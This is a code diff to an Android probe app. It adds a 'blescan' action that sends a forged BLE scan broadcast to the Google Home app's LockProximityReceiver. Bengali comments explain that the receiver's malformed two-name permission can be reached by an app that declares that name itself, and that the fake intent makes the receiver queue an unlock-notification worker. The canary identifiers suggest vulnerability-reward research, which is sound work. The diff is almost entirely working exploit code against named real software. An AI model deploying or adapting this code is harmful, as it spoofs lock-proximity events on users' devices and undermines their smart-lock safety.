@@ -65,6 +65,7 @@ public class MainActivity extends Activity implements ServiceConnection, Runnabl
             else if ("start".equals(action))  doStart(in);
             else if ("startact".equals(action)) doStartActivity(in);
             else if ("broadcast".equals(action)) doBroadcast(in);
+            else if ("blescan".equals(action)) doBleScan(in);
             else Log.i(TAG, "actions: call | query | bind | transact | wellbeing | start | startact | broadcast");
         } catch (Throwable t) {
             // শ্রেণির নামই প্রায়ই আসল উত্তর:
@@ -313,6 +314,68 @@ public class MainActivity extends Activity implements ServiceConnection, Runnabl
         if (a != null) b.setAction(a);
         String ek = in.getStringExtra("extraKey");
         if (ek != null) b.putExtra(ek, in.getStringExtra("extraVal"));
+        try {
+            sendBroadcast(b);
+            Log.i(TAG, "sendBroadcast() ফেরত এসেছে, exception ছাড়া");
+        } catch (SecurityException e) {
+            Log.i(TAG, "SECURITY " + e.getMessage());
+        } catch (Throwable t) {
+            Log.i(TAG, "THROWN " + t.getClass().getName() + ": " + t.getMessage());
+        }
+    }
+
+    /**
+     * Google Home-এর LockProximityReceiver-এ একটা জাল BLE-scan ঘটনা পাঠাও।
+     *
+     * manifest-এ receiver-টা পাহারা দেওয়া:
+     *     android:permission="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
+     * কিন্তু ওই নামে কোনো permission নেই — android:permission একটাই নাম নেয়,
+     * দুটো নয়। ফলে কেউই ওটা ধরে না, আর receiver-টা কার্যত অপৌঁছনীয়...
+     * যতক্ষণ না কেউ নামটা **নিজে ঘোষণা করে**। সেটাই এই app করে।
+     *
+     * onReceive যা পড়ে, সবই এখান থেকে যায়: hgs_device_id, device_name,
+     * request_id, আর ScanResult তালিকা। তারপর সে
+     * "tln_send_unlock_notification_worker" কাজটা সারিতে দেয়।
+     *
+     * ScanRecord null রাখা হয়েছে ইচ্ছে করে — তার public constructor নেই,
+     * আর null দিলে manufacturer_data শাখাটা বাদ যায় কিন্তু worker তবু চলে।
+     * কম payload-এ যদি চলে, সেটাই পরিষ্কার প্রমাণ।
+     */
+    private void doBleScan(Intent in) {
+        String pkg = in.getStringExtra("pkg");
+        if (pkg == null) pkg = "com.google.android.apps.chromecast.app";
+        String cls = in.getStringExtra("cls");
+        if (cls == null) cls = "com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver";
+        String hgs = in.getStringExtra("hgs");
+        if (hgs == null) hgs = "MVRP-CANARY-ID";
+        String nm = in.getStringExtra("name");
+        if (nm == null) nm = "MVRP CANARY LOCK";
+
+        Intent b = new Intent("com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED");
+        b.setComponent(new ComponentName(pkg, cls));
+        b.putExtra("hgs_device_id", hgs);
+        b.putExtra("device_name", nm);
+        b.putExtra("request_id", 1);
+
+        try {
+            android.bluetooth.BluetoothAdapter ad = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
+            if (ad == null) {
+                Log.i(TAG, "BluetoothAdapter null — ScanResult ছাড়াই পাঠাচ্ছি");
+            } else {
+                android.bluetooth.BluetoothDevice dev = ad.getRemoteDevice("AA:BB:CC:DD:EE:FF");
+                android.bluetooth.le.ScanResult sr =
+                        new android.bluetooth.le.ScanResult(dev, null, -50, 0L);
+                java.util.ArrayList<android.os.Parcelable> list =
+                        new java.util.ArrayList<android.os.Parcelable>();
+                list.add(sr);
+                b.putParcelableArrayListExtra("android.bluetooth.le.extra.LIST_SCAN_RESULT", list);
+                Log.i(TAG, "ScanResult তৈরি হয়েছে (ScanRecord=null)");
+            }
+        } catch (Throwable t) {
+            Log.i(TAG, "ScanResult বানানো গেল না: " + t.getClass().getName() + ": " + t.getMessage());
+        }
+
+        Log.i(TAG, "BLESCAN -> " + pkg + "/" + cls + "  name=" + nm + " hgs=" + hgs);
         try {
             sendBroadcast(b);
             Log.i(TAG, "sendBroadcast() ফেরত এসেছে, exception ছাড়া");
